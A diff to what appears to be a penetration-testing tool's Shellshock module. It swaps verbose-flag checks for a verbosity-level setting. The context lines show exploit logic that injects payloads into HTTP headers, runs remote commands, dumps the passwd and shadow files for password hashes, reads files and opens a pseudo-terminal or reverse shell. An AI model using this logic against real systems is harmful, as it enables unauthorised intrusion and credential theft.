@@ -83,7 +83,7 @@ def enumeration(url, cve, check_header, filename):
   if menu.options.hostname:
     cmd = settings.HOSTNAME
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if menu.options.verbose:
+    if settings.VERBOSITY_LEVEL >= 1:
       print ""
     success_msg = "The hostname is " + Style.UNDERLINE + shell
     sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
@@ -105,7 +105,7 @@ def enumeration(url, cve, check_header, filename):
       cmd = settings.RECOGNISE_HP
       target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
       if target_arch:
-        if menu.options.verbose:
+        if settings.VERBOSITY_LEVEL >= 1:
           print ""
         success_msg = "The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL  
         success_msg += Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch
@@ -118,7 +118,7 @@ def enumeration(url, cve, check_header, filename):
         output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
         output_file.close()
     else:
-      if menu.options.verbose:
+      if settings.VERBOSITY_LEVEL >= 1:
         print ""
       success_msg = "The target operating system is " + Style.UNDERLINE + target_os   
       sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
@@ -140,7 +140,7 @@ def enumeration(url, cve, check_header, filename):
       if menu.options.is_root:
         cmd = settings.IS_ROOT
         shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-        if menu.options.verbose:
+        if settings.VERBOSITY_LEVEL >= 1:
           print ""
         success_msg = "The current user is " + Style.UNDERLINE + cu_account  
         sys.stdout.write(settings.print_success_msg(success_msg))
@@ -165,7 +165,7 @@ def enumeration(url, cve, check_header, filename):
             output_file.write(" and it is privileged.\n")
             output_file.close()
       else:
-        if menu.options.verbose:
+        if settings.VERBOSITY_LEVEL >= 1:
           print ""
         success_msg = "The current user is " + Style.UNDERLINE + cu_account  
         sys.stdout.write(settings.print_success_msg(success_msg))
@@ -183,7 +183,7 @@ def enumeration(url, cve, check_header, filename):
   if menu.options.users:
     cmd = settings.SYS_USERS             
     sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
-    if menu.options.verbose:
+    if settings.VERBOSITY_LEVEL >= 1:
       print ""
     info_msg = "Fetching '" + settings.PASSWD_FILE 
     info_msg += "' to enumerate users entries... "  
@@ -304,7 +304,7 @@ def enumeration(url, cve, check_header, filename):
       sys_passes = sys_passes.replace(" ", "\n")
       sys_passes = sys_passes.split( )
       if len(sys_passes) != 0 :
-        if menu.options.verbose:
+        if settings.VERBOSITY_LEVEL >= 1:
           print ""
         info_msg = "Fetching '" + settings.SHADOW_FILE 
         info_msg += "' to enumerate users password hashes... "  
@@ -396,7 +396,7 @@ def file_access(url, cve, check_header, filename):
     # Check if defined cookie injection.
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      if menu.options.verbose:
+      if settings.VERBOSITY_LEVEL >= 1:
         print ""
       success_msg = "The " + Style.UNDERLINE + shell + Style.RESET_ALL 
       success_msg += Style.BRIGHT + " file was created successfully!"  
@@ -443,7 +443,7 @@ def file_access(url, cve, check_header, filename):
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     shell = "".join(str(p) for p in shell)
     if shell:
-      if menu.options.verbose:
+      if settings.VERBOSITY_LEVEL >= 1:
         print ""
       success_msg = "The " + Style.UNDERLINE + shell 
       success_msg += Style.RESET_ALL + Style.BRIGHT 
@@ -466,7 +466,7 @@ def file_access(url, cve, check_header, filename):
     cmd = "cat " + settings.FILE_READ + file_to_read
     shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
-      if menu.options.verbose:
+      if settings.VERBOSITY_LEVEL >= 1:
         print ""
       success_msg = "The contents of file '" + Style.UNDERLINE 
       success_msg += file_to_read + Style.RESET_ALL + "' : "  
@@ -515,14 +515,14 @@ def shellshock_handler(url, http_request_method, filename):
         payload = shellshock_payloads(cve, attack_vector)
 
         # Check if defined "--verbose" option.
-        if menu.options.verbose:
+        if settings.VERBOSITY_LEVEL >= 1:
           sys.stdout.write("\n" + settings.print_payload(payload))
 
         header = {check_header : payload}
         request = urllib2.Request(url, None, header)
         response = urllib2.urlopen(request)
 
-        if not menu.options.verbose:
+        if not settings.VERBOSITY_LEVEL >= 1:
           percent = ((i*100)/total)
           float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
           
@@ -556,11 +556,11 @@ def shellshock_handler(url, http_request_method, filename):
           print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type.title() + Style.RESET_ALL + ""
           print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
           print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + "\"" + payload + "\"" + Style.RESET_ALL
-          if not menu.options.verbose:
+          if not settings.VERBOSITY_LEVEL >= 1:
             print ""
           # Enumeration options.
           if settings.ENUMERATION_DONE == True :
-            if menu.options.verbose:
+            if settings.VERBOSITY_LEVEL >= 1:
               print ""
             while True:
               question_msg = "Do you want to enumerate again? [Y/n/q] > "
@@ -616,7 +616,7 @@ def shellshock_handler(url, http_request_method, filename):
               if go_back == True:
                 break
               if settings.ENUMERATION_DONE == False and settings.FILE_ACCESS_DONE == False:
-                if menu.options.verbose:
+                if settings.VERBOSITY_LEVEL >= 1:
                   print ""
               question_msg = "Do you want a Pseudo-Terminal? [Y/n/q] > "
               gotshell = raw_input(settings.print_question_msg(question_msg)).lower()
@@ -671,7 +671,7 @@ def shellshock_handler(url, http_request_method, filename):
                               break
                           # Command execution results.
                           shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
-                          if menu.options.verbose:
+                          if settings.VERBOSITY_LEVEL >= 1:
                             print ""
                           err_msg = "The reverse TCP connection to the target host has been failed!"
                           print settings.print_error_msg(err_msg)
@@ -683,7 +683,7 @@ def shellshock_handler(url, http_request_method, filename):
                       if shell != "":
                         print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
                       else:
-                        if menu.options.verbose:
+                        if settings.VERBOSITY_LEVEL >= 1:
                           print "\n" + settings.print_payload(payload) 
                         err_msg = "The '" + cmd + "' command, does not return any output."
                         print settings.print_error_msg(err_msg) + "\n"
@@ -761,12 +761,12 @@ def cmd_exec(url, cmd, cve, check_header, filename):
   if len(shell) == 0:
     cmd = "/bin/" + cmd
     shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
-    if menu.options.verbose and len(shell) > 0:
+    if settings.VERBOSITY_LEVEL >= 1 and len(shell) > 0:
       sys.stdout.write("\n" + settings.print_payload(payload))
     if len(shell) == 0:
       cmd = "/usr" + cmd
       shell, payload = check_for_shell(url, cmd, cve, check_header, filename)
-      if menu.options.verbose and len(shell) > 0:
+      if settings.VERBOSITY_LEVEL >= 1 and len(shell) > 0:
         sys.stdout.write("\n" + settings.print_payload(payload))
 
   return shell, payload
